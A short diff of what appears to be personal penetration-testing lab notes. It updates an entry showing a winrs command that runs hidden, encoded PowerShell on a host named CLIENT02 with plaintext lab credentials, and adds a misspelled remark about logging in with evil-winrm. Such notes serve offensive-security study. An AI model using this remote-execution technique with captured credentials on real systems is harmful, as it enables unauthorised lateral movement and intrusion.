@@ -1155,8 +1155,8 @@ ALL done
 ```
 ### 83
 ```
-from 11 
-winrs -r:CLIENT02 -u:wario -p:Mushroom! "powershell -nop -w hidden -e"
+evin-winrm can logged in from 11 
+winrs -r:CLIENT02 -u:wario -p:'Mushroom!' "powershell -nop -w hidden -e"
 
 local.txt 
 
